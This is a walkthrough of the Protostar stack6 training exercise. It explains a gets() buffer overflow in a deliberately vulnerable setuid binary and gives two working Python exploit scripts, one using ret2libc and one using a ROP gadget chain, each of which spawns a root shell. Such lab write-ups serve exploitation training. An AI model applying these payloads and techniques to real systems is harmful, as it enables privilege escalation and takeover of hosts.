# For stack6 of protostar

> Stack6 looks at what happens when you have restrictions on the return address.
>  
> This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.
>  
> It is strongly suggested you experiment with multiple ways of getting your code to execute here.
>  
> This level is at /opt/protostar/bin/stack6


Let's take a look at the source code.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

From the source code,  we know that the program is vulnerable to stack smashing. 

With input `aaaaabbbbbcccccdddddeeeeefffffggggghhhhhiiiiijjjjjjkkkkklllllmmmmmnnnnnooooopppppqqqqqrrrrrsssss`, the return address located in address `0xbffff69c` was overwritten to `0x71717170`.
```
(gdb) x/32xw $esp-0x64
0xbffff638:	0xb7fe1b28	0x00000001	0x00000000	0x00000001
0xbffff648:	0xb7fff8f8	0x61616161	0x62626261	0x63636262
0xbffff658:	0x64636363	0x64646464	0x65656565	0x66666665
0xbffff668:	0x67676666	0x68676767	0x68686868	0x69696969
0xbffff678:	0x6a6a6a69	0x6b6a6a6a	0x6b6b6b6b	0x6c6c6c6c
0xbffff688:	0x6d6d6d6c	0x71717170	0x6f6e6e6e	0x6f6f6f6f
0xbffff698:	0x70707070	0x71717170	0x72727171	0x73727272
0xbffff6a8:	0x73737373	0xb7eadc00	0x00000001	0xbffff754
(gdb) p/x $esp
$1 = 0xbffff69c
(gdb) 
```
The `0x71717170` located in address `0xbffff68c` is actually the value of the local variable `ret`, which got its value from the function [__builtin_return_address](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html). The memory dump shows that user input is stored in address `0xbffff64c`, so we need padding of 80 characters to reach the return address.


However, the program checks to make sure that the return address we provide does not begin with `0xbf...`. Running `info proc mappings` in gdb shows us that the stack starts at address `0xbffeb000`. That means the program does *not* allow us to return to our shellcode in the stack.

```
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]

```

### Return to Lib C

Instead of inserting a shellcode into the stack and executing it like we did in previous challenges, the program recommends *ret2libc*.

> A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.

The shared library `libc-2.11.2.so` was mapped to address `0xb7e97000` onwards, so the program will allow us to return to C library functions in it, for example `00038fb0 <__libc_system>:`. All we need is to take into account the offset in memory address. In other words, while `<__libc_system>` is in address `0x97170` in the shared library, it is in address `0xb7e97000 + 0x38fb0 = 0xb7ecffb0` We could call `system(/bin/sh)` to get us a shell as root. I also found the string `'/bin/sh'` in the shared library. I don't know why it would ever be in there, but it is.
```
user@protostar:/opt/protostar/bin$ strings --radix=x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```
The address of the string in `stack6` is `0xb7e97000 + 0x11f3bf = 0xb7fb63bf`. We can verify it in gdb.
```
(gdb) x/s 0xb7fb63bf
0xb7fb63bf:	 "/bin/sh"
```
Funnily however, if we use the `find` function in gdb, gdb somehow does not give us the correct address of `'/bin/sh'`. Oh well, shit happens. ¯\_(ツ)_/¯
```
(gdb) find 0xb7e97000, 0xb7fd5000, "/bin/sh"
0xb7fba23f
1 pattern found.
(gdb) x/s 0xb7fba23f
0xb7fba23f:	 "KIND in __gen_tempname\""
```

So how would our input look like? This is a Python script that prints out our input.
```
padding = '\x61' * 80
return_addr = '\xb0\xff\xec\xb7'
more_padding = '\x61\x61\x61\x61'
addr_of_sh = '\xbf\x63\xfb\xb7'
print padding+return_addr+more_padding+addr_of_sh
```
Let me explain what the purpose of `more_padding` is. Recall that before you call a function (called the 'callee'), you would push the arguments to the stack. That means that the callee's arguments would be a return address away from the callee's stack frame. Hence, to pass the argument `'/bin/sh'` to the callee function `__libc_system`, we need to simulate a return address in between the 2. We can ignore the `ebp` of the caller function because the callee function is that one that pushes it to the stack, so it takes that into account when accessing its arguments.

![stack_frame_pic](https://y86tutoring.files.wordpress.com/2012/10/caller-callee.png)

With that input, we get ourselves a root shell.
```
user@protostar:/opt/protostar/bin$ python /home/user/stack6.py > ~/input\ stack6
user@protostar:/opt/protostar/bin$ cat ~/input\ stack6 - | ./stack6 
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����aaaaaaaaaaaa����aaaa�c��
whoami
root
```

In case you are wondering how we got a root shell, `stack6` is a setuid program owned by `root`. So our EUID is `root`, so is the EUID of all child processes of the `stack6` program. That's how we got the root shell.

### Return Oriented Programming

>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets". Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.

The clues given in the exploit-exercises website tells us we can also use Return Oriented Programming.

Before we search for ROP gadgets, let's take a moment to think about how our shellcode would look like if we were able to execute it in the stack. It basically executes `execve('/bin/sh')`.

```
mov eax, 0xb		; syscall reference for execve
mov ebx, 0xb7fb63bf	; address of string '/bin/sh'
xor ecx, ecx
xor edx, edx
int 0x80
```

I headed to [ropshell](http://ropshell.com) to find ROP gadgets that behave similarly to each line of assembly in our shellcode above. This are 4 ROP gadgets we can chain together to execute `execve('/bin/sh')`.
```
> 0x000cebe0 : pop ecx; pop eax; ret
> 0x00074886 : pop ebx; ret
> 0x0002a2fc : pop edx; ret
> 0x00097bf5 : int 0x80; ret
```
Because `libc-2.11.2.so` is mapped to a different virtual memory address during runtime of `./stack6`, we have to take into account its new base address, which is `0xb7e97000`. We add the offset of the ROP gadgets to it to get their relocated addresses in `stack6`.

```
> 0xb7f65be0 : pop ecx; pop eax; ret
> 0xb7f0b886 : pop ebx; ret
> 0xb7ec12fc : pop edx; ret
> 0xb7f2ebf5 : int 0x80; ret
```
We can verify this in gdb. For instance, let's look at the first ROP gadget `0xb7f65be0 : pop ecx; pop eax; ret`.
```
(gdb) x/3i 0xb7f65be0
0xb7f65be0 <mcount+16>:	pop    ecx
0xb7f65be1 <mcount+17>:	pop    eax
0xb7f65be2 <mcount+18>:	ret 
```

So this is what the format of our input would look like: `< 80 chars padding > < ret addr to ROP gadget 1 > < ecx value > < eax value > < ret addr to ROP gadget 2> < ebx value > < ret addr to ROP gadget 3 > < edx value > < ret addr to ROP gadget 4 >`.

This is the Python script that pieces our ROP gadgets together.
```
import struct

padding = '\x61' * 80

addr_of_gadget_1 = struct.pack("I", 0xb7f65be0)
addr_of_gadget_2 = struct.pack("I", 0xb7f0b886)
addr_of_gadget_3 = struct.pack("I", 0xb7ec12fc)
addr_of_gadget_4 = struct.pack("I", 0xb7f2ebf5)


edx_value = ecx_value = '\x00\x00\x00\x00'
ebx_value = struct.pack("I", 0xb7fb63bf)
eax_value = '\x0b\x00\x00\x00'

print padding + addr_of_gadget_1 + ecx_value + eax_value + addr_of_gadget_2 + ebx_value + addr_of_gadget_3 + edx_value + addr_of_gadget_4
```

Running `stack6` with our ROP input, we get a root shell.
```
user@protostar:/opt/protostar/bin$ python /tmp/stack6\ ROP.py > /tmp/stack6\ ROP
user@protostar:/opt/protostar/bin$ cat /tmp/stack6\ ROP - | ./stack6 
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�[��aaaaaaaaaaaa�[��
whoami
root
```

END
